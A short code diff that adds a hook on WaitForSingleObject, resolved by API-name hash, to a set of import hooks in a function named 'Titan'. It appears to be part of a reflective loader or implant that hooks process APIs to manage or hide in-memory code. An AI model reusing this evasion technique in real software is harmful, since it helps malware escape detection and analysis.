@@ -114,6 +114,7 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5c3f8699, PTR_TO_HOOK( Mem, ReadProcessMemory_Hook ) );
 			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xb7930ae8, PTR_TO_HOOK( Mem, WriteProcessMemory_Hook ) );
+			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0df1b3da, PTR_TO_HOOK( Mem, WaitForSingleObject_Hook ) );
 		};
 
 		/* Get a pointer to the relocation table */
